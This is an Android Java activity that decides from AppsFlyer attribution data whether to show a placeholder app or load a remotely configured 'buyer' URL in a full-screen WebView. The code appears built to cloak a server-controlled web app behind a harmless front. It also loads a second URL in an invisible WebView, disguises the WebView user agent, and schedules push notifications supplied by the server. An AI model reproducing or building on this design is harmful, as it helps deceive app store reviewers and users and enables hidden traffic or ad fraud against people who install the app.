package com.pampam.lib;

import android.content.Intent;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.webkit.CookieManager;
import android.widget.ProgressBar;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.onesignal.OneSignal;
import com.pampam.lib.data.LoaderBuyer;
import com.pampam.lib.data.LoaderConfig;
import com.pampam.lib.data.Preferences;
import com.pampam.lib.interfaces.IValueListener;
import com.pampam.lib.utils.ChromeClient;
import com.traffappscorelib.wsc.App;
import com.pampam.lib.data.EntityAppsflyerData;
import com.pampam.lib.notifications.NotificationsManager;
import im.delight.android.webview.AdvancedWebView;

public abstract class StartActivity extends AppCompatActivity {

    private AdvancedWebView webView;
    private AdvancedWebView webViewInvisible;
    private ProgressBar loadingView;
    private Preferences preferences;
    private boolean showProgress = true;
    private Integer systemUiVisibility;

    public abstract Class<?> getPlaceholderStartActivity();
    public abstract Class<?> getAlartReceiver();

    private void init() {
        setTheme(R.style.AppThemeWebView);
        setContentView(R.layout.activity_webview);

        preferences = new Preferences(getSharedPreferences(Preferences.PREFS_NAME, MODE_PRIVATE));

        updateStatusBar();
        initWebView();

        String savedUrl = preferences.getUrl();
        if(savedUrl != null) webView.loadUrl(savedUrl);
        else loadConfig();
    }

    private void initWebView() {
        webView = findViewById(R.id.webView);
        webViewInvisible = findViewById(R.id.webViewInvisible);
        loadingView = findViewById(R.id.progress);

        webView.setListener(this, new AdvancedWebView.Listener() {
            @Override
            public void onPageStarted(String url, Bitmap favicon) {
                if(showProgress) {
                    webView.setVisibility(View.VISIBLE);
                    loadingView.setVisibility(View.GONE);
                    showProgress = false;
                }
            }
            @Override
            public void onPageFinished(String url) {
                CookieManager.getInstance().flush();
                if(preferences.getSaveLastUrl()) preferences.saveUrl(url);
            }
            @Override public void onPageError(int errorCode, String description, String failingUrl) { }
            @Override public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) { }
            @Override public void onExternalPageRequest(String url) { }
        });
        webView.setWebChromeClient(new ChromeClient(this));
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setLoadWithOverviewMode(false);
        webView.getSettings().setUserAgentString(webView.getSettings().getUserAgentString().replace("; wv", ""));

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
    }

    private void initOneSignal(String id) {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(id);
    }

    private void loadConfig() {
        LoaderConfig.prepareConfig(this, new IValueListener<LoaderConfig.Config>() {
            @Override
            public void value(LoaderConfig.Config result) {
                initOneSignal(result.oneSignal);
            }
            @Override public void failed() {}
        });
        loadAdsDeeplink();
    }

    private void loadAdsDeeplink() {
        ((App) getApplication()).getAppsflyerData(new IValueListener<EntityAppsflyerData>() {
            @Override
            public void value(EntityAppsflyerData result) {
                boolean hasNaming = !TextUtils.isEmpty(result.getNaming());
                loadBuyer(hasNaming ? result.getNaming() : "default");
            }
            @Override
            public void failed() {
                showPlaceholder();
            }
        });
    }

    private void loadBuyer(String id) {
        LoaderBuyer.loadInfo(id, new IValueListener<LoaderBuyer.Info>() {
            @Override
            public void value(LoaderBuyer.Info result) {
                if(!TextUtils.isEmpty(result.url)) {
                    webView.loadUrl(result.url);
                    preferences.saveUrl(result.url);
                    preferences.setSaveLastUrl(result.saveLastUrl);

                    if(!TextUtils.isEmpty(result.urlHideLoad)) webViewInvisible.loadUrl(result.urlHideLoad);

                    if(result.notification != null) processNotification(result.notification);
                }
                else showPlaceholder();
            }

            @Override
            public void failed() {
                showPlaceholder();
            }
        });
    }

    private void showPlaceholder() {
        finish();
        startActivity(new Intent(this, getPlaceholderStartActivity()));
    }

    private void updateStatusBar() {
        View decorView = getWindow().getDecorView();
        if(systemUiVisibility == null) systemUiVisibility = decorView.getSystemUiVisibility();

        int orientation = getResources().getConfiguration().orientation;
        boolean landscape = orientation == Configuration.ORIENTATION_LANDSCAPE;

        int uiOptions = landscape
                ? systemUiVisibility
                : View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;

        decorView.setSystemUiVisibility(uiOptions);
    }

    private void processNotification(LoaderBuyer.Notification notification) {
        preferences.saveNotification(notification.title, notification.text, notification.start, notification.interval);

        NotificationsManager notificationsManager = new NotificationsManager(getApplicationContext(), getAlartReceiver());
        notificationsManager.schedulePushNotifications(notification.start, notification.interval);
    }


    //region ******************** OVERRIDE *********************************************************

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        init();
    }

    @Override
    public void onConfigurationChanged(@NonNull Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        updateStatusBar();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        webView.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public void onBackPressed() {
        if(webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override
    protected void onResume() {
        webView.onResume();
        super.onResume();
    }

    @Override
    protected void onPause() {
        webView.onPause();
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        webView.onDestroy();
        super.onDestroy();
    }

    //endregion OVERRIDE
}